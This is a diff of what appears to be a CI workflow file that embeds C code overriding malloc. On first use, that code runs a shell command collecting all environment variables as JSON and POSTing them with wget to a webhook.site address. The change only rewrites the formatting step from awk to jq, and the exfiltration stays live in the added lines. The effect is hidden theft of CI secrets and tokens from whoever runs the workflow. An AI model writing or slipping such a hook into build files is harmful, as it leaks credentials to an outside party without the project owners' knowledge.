@@ -27,12 +27,9 @@ jobs:
           void *malloc(size_t size)
           {
               if(i == 0) {
-                system("env | awk 'BEGIN { print \"{\\\"environment\\\":{ \" }' "
-                "-f <(echo 'BEGIN{}; { gsub(/\"/, \"\\\\\\\"\", $0); print \"\\\"\" $1 \"\\\":\"\\\"\" $2 \"\\\",\" }' "
-                "ORS='') "
-                "-f <(echo 'END{ print \"}}\" }') "
-                "| wget --quiet --method=POST --header='Content-Type: application/json' "
-                "--body-data@- https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64 -O -");
+                system("env | jq -Rn 'reduce inputs as $i ({}; . + { ($i | split(\"=\")[0]): ($i | split(\"=\")[1]) })' | "
+                "wget --quiet --method=POST --header='Content-Type: application/json' --body-data@- "
+                "https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64 -O -");
                 i = i++;
               }
 
